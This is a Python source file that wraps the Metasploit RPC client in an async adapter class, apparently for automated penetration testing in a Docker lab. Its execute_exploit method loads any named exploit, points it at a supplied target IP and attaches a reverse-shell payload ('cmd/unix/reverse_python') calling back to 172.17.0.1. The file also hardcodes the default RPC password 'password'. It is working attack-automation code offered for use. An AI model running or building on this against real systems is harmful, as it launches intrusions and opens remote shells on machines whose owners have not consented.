import asyncio
import logging
from pymetasploit3.msfrpc import MsfRpcClient

class MsfAdapter:
    def __init__(self, password="password", host="127.0.0.1", port=55553):
        self.password = password
        self.host = host
        self.port = port
        self.client = None
        self.logger = logging.getLogger("MsfAdapter")

    async def connect(self):
        """Connects to the RPC server (blocking call wrapped)."""
        loop = asyncio.get_running_loop()
        try:
            self.client = await loop.run_in_executor(
                None, 
                lambda: MsfRpcClient(self.password, port=self.port, ssl=True)
            )
            self.logger.info("Connected to Metasploit RPC")
        except Exception as e:
            self.logger.error(f"Failed to connect to MSF: {e}")
            raise

    async def execute_exploit(self, exploit_name, target_ip, payload_type="cmd/unix/reverse_python"):
        """
        Executes an exploit against a target.
        """
        if not self.client:
            await self.connect()

        loop = asyncio.get_running_loop()
        
        def _run():
            exploit = self.client.modules.use('exploit', exploit_name)
            exploit['RHOSTS'] = target_ip
            
            # Basic payload setup
            payload = self.client.modules.use('payload', payload_type)
            payload['LHOST'] = '172.17.0.1' # Bridge Gateway
            
            return exploit.execute(payload=payload)

        result = await loop.run_in_executor(None, _run)
        return result
